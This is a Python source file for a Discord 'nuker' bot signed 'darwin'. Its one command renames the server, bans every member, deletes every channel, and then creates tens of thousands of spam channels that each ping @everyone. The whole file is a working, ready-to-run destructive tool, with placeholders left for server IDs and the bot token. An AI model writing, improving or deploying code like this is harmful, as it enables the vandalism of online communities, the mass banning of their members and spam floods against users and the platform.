import discord
from discord.ext import commands
import random

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

print("bot is alive")

channel_names = [
    "nuked by darwin", "nuked by darwin",
    "nuked by darwin", "nuked by darwin",
    "nuked by darwin", "nuked by darwin"
]

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command(name='ogsg')
async def create_and_delete_channels(ctx):
    allowed_server_ids = {your_server_id, your_server_for_test}
    if ctx.guild.id not in allowed_server_ids:
        await ctx.send("Try this command in: discord.gg/link_to_server")
        return

    try:
        new_name = "server nuked by darwin"
        await ctx.guild.edit(name=new_name)
        print(f'Server name changed to {new_name}')
    except discord.Forbidden:
        print('Failed to change server name')
    except discord.HTTPException as e:
        print(f'HTTPException: {e}')

    for member in ctx.guild.members:
        try:
            await member.ban(reason="nuked by darwin")
            print(f'Banned {member.name}')
        except discord.Forbidden:
            print(f'Failed to ban {member.name}')
        except discord.HTTPException as e:
            print(f'HTTPException: {e}')

    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f'Deleted {channel.name}')
        except discord.Forbidden:
            print(f'Failed to delete {channel.name}')
        except discord.HTTPException as e:
            print(f'HTTPException: {e}')

    for i in range(1, 99999):
        try:
            channel_name = random.choice(channel_names)
            new_channel = await ctx.guild.create_text_channel(f'{channel_name}-{i}')
            await new_channel.send('@everyone nuked by darwin')
            print(f'Created channel {new_channel.name}')
        except discord.Forbidden:
            print(f'Failed to create channel {channel_name}-{i}')
        except discord.HTTPException as e:
            print(f'HTTPException: {e}')

    await ctx.send('deleted all')

bot.run('your_bot_token')